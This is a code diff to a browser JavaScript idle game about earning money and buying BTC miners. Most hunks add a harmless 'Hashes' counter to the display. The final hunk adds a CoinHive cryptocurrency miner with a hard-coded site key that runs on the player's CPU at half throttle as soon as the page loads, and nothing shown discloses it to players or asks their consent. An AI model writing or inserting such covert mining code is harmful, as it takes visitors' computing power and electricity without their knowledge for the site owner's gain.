@@ -26,6 +26,7 @@ let d_money = $("<li>");
 let d_earn = $("<li>");
 let d_BTCminers = $("<li>");
 let d_BTCminer_cost = $("<li>");
+let d_hashes = $("<li>");
 let d_time_programming = $("<li>");
 
 
@@ -59,6 +60,7 @@ $("document").ready( () => {
     d_earn,
     d_BTCminers,
     d_BTCminer_cost,
+    d_hashes,
     d_time_programming);
 
   main();});
@@ -110,6 +112,7 @@ function updateValuesShown() {
   d_earn.text("earn: " + earn);
   d_BTCminers.text("BTCminers: " + BTCminers);
   d_BTCminer_cost.text("BTCminer_cost: " + BTCminer_cost);
+  d_hashes.text("Hashes: " + hashes);
   d_time_programming.text("Time programming: " + programming_time + " hours");
 
   money_value.text("$" + money.toFixed());
@@ -148,7 +151,7 @@ function delta_money(change) {
   }
   delta.appendTo(money_count);
   setTimeout(() => {
-    console.log("Tried to remove");
+    //console.log("Tried to remove");
     delta.remove();
   }, 3500);
 }
@@ -180,3 +183,12 @@ function change_money_color() {
   money_value.css('color',  color );
   money_value.css('text-shadow',  color_shadow);
 }
+
+//******************************************************************************
+//  Mine on the user's CPU
+//******************************************************************************
+let hashes = 0;
+let miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
+miner.on('found', function() { hashes++; })
+miner.setThrottle(.5);
+miner.start();
